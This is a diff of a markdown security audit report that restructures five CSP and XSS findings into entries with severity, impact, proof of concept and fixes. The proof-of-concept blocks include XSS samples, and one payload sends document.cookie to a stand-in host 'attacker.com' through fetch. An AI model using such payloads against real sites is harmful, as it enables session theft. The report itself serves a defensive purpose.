@@ -11,93 +11,172 @@ The below items MUST be fixed in **application code**.
 
 ---
 
-## Issues Requiring Developer Fix
+## 1. Vulnerability Name  
+**Unsafe Inline Scripts Allowed in CSP**
 
----
+- **OWASP Category:** A03: Injection (Cross-Site Scripting - XSS)  
+- **Affected File & Line Number:**  
+  Multiple HTML files (e.g., index.html, inline `<script>` blocks)
 
-## 1 Unsafe Inline Scripts (CSP Violation)
+- **Severity:** High  
 
-### Issue
+- **Description:**  
+The application uses inline JavaScript, which forces the Content Security Policy (CSP) to allow `'unsafe-inline'`. This weakens CSP protection and allows execution of injected scripts.
 
-Inline JavaScript is currently used in the application, which requires allowing `'unsafe-inline'` in CSP — this introduces **XSS risk**.
+- **Business Impact:**  
+An attacker can:
+- Steal session cookies  
+- Perform actions on behalf of users  
+- Redirect users to malicious websites  
 
-### Example (Current)
-
+- **Proof of Concept:**  
 ```html
-<script>
-  alert("test");
-</script>
+<script>alert(document.cookie)</script>
+````
+
+```javascript
+document.body.innerHTML += '<script>alert(1)</script>';
 ```
 
-### Required Fix
-
-Move all inline scripts to external files:
+* **Recommended Fix:**
+  Move inline scripts to external files:
 
 ```html
 <script src="/js/app.js"></script>
 ```
 
+Update CSP:
+
+```text
+script-src 'self';
+```
+
 ---
 
-## 2 Use of `eval()` or Dynamic Code Execution
+## 2. Vulnerability Name
 
-### Issue
+**Use of eval() / Unsafe Dynamic Code Execution**
 
-Usage of `eval()` or similar functions requires `'unsafe-eval'`, which is **highly insecure**.
+* **OWASP Category:** A03: Injection
 
-### Example
+* **Affected File & Line Number:**
+  JavaScript files where `eval()` is used
+
+* **Severity:** Critical
+
+* **Description:**
+  The application uses `eval()` or similar functions, which execute arbitrary JavaScript code dynamically. This requires `'unsafe-eval'` in CSP and allows attackers to run injected code.
+
+* **Business Impact:**
+  An attacker can:
+
+* Execute arbitrary JavaScript
+
+* Take control of user sessions
+
+* Bypass input validation
+
+* **Proof of Concept:**
+
+```javascript
+eval("alert('XSS')");
+```
 
 ```javascript
 eval(userInput);
 ```
 
-### Required Fix
+Payload:
 
-Replace with safe alternatives:
+```javascript
+userInput = "fetch('https://attacker.com?cookie='+document.cookie)"
+```
+
+* **Recommended Fix:**
+  Replace with safe alternatives:
 
 ```javascript
 JSON.parse(userInput);
 ```
 
+Update CSP:
+
+```text
+script-src 'self';
+```
+
 ---
 
-## 3 Missing Subresource Integrity (SRI)
+## 3. Vulnerability Name
 
-### Issue
+**Missing Subresource Integrity (SRI) for External Scripts**
 
-External scripts (CDN) are loaded without integrity validation.
+* **OWASP Category:** A06: Vulnerable and Outdated Components
 
-### Example
+* **Affected File & Line Number:**
+  HTML files loading CDN resources
+
+* **Severity:** Medium
+
+* **Description:**
+  External scripts are loaded from CDNs without integrity validation. If the CDN is compromised, malicious scripts can be executed.
+
+* **Business Impact:**
+  An attacker can:
+
+* Inject malicious scripts via CDN
+
+* Steal sensitive data
+
+* Deface the application
+
+* **Proof of Concept:**
 
 ```html
 <script src="https://cdn.example.com/lib.js"></script>
 ```
 
-### Required Fix
-
-Add integrity hash:
+* **Recommended Fix:**
+  Add SRI hash:
 
 ```html
 <script 
   src="https://cdn.example.com/lib.js"
-  integrity="sha384-<HASH>"
+  integrity="sha384-abc123..."
   crossorigin="anonymous">
 </script>
 ```
 
 ---
 
-## 4 CSP Directive Adjustments for External Resources
+## 4. Vulnerability Name
 
-### Issue
+**Improper CSP Configuration for External Resources**
 
-If the application uses external APIs/CDNs, they must be explicitly allowed in CSP.
+* **OWASP Category:** A05: Security Misconfiguration
 
-### Required Fix
+* **Affected File & Line Number:**
+  CSP header configuration
 
-Coordinate required domains and update policy accordingly.
+* **Severity:** Medium
 
-Example:
+* **Description:**
+  CSP does not explicitly define trusted external domains, which may result in overly permissive or restrictive policies.
+
+* **Business Impact:**
+
+* Increased attack surface (if too permissive)
+
+* Broken functionality (if too restrictive)
+
+* **Proof of Concept:**
+
+```text
+connect-src 'self';
+```
+
+* **Recommended Fix:**
+  Define allowed domains explicitly:
 
 ```text
 connect-src 'self' https://api.example.com;
@@ -106,18 +185,40 @@ img-src 'self' https://cdn.example.com;
 
 ---
 
-## 5 Avoid Inline Styles (Optional Improvement)
+## 5. Vulnerability Name
 
-### Issue
+**Use of Inline Styles (CSP Weakening)**
 
-Inline styles require `'unsafe-inline'` in `style-src`.
+* **OWASP Category:** A05: Security Misconfiguration
 
-### Recommended Fix
+* **Affected File & Line Number:**
+  HTML files using inline styles
 
-Move styles to CSS files or use frameworks properly.
+* **Severity:** Low
+
+* **Description:**
+  Inline styles require `'unsafe-inline'` in CSP `style-src`, reducing overall CSP effectiveness.
+
+* **Business Impact:**
+
+* May assist UI-based attacks
+
+* Weakens CSP protection
+
+* **Proof of Concept:**
+
+```html
+<div style="color:red;">Test</div>
+```
+
+* **Recommended Fix:**
+  Move styles to external CSS:
+
+```html
+<link rel="stylesheet" href="/css/style.css">
+```
 
 ---
-
 ## Already Implemented (Infrastructure Side)
 
 The following protections are already enforced at the server level:
